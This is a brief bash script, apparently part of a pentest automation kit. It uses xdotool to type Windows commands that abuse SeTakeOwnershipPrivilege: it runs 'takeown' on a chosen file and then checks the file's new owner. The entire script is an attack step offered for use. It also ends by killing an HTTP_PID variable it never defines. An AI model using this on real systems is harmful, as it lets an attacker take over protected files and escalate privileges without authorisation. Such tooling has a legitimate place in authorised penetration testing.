#!/bin/bash

: '
exploit SeTakeOwnershipPrivilege permission
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "File"

FILE=${form_data["File"]}

paste_command "takeown /f '${FILE}'"
xdotool key Return
sleep 2

paste_command "Get-ChildItem -Path '${FILE}' | select name,directory, @{Name="Owner";Expression={(Get-ACL \$_.Fullname).Owner}}"
xdotool key Return
sleep 2

kill $HTTP_PID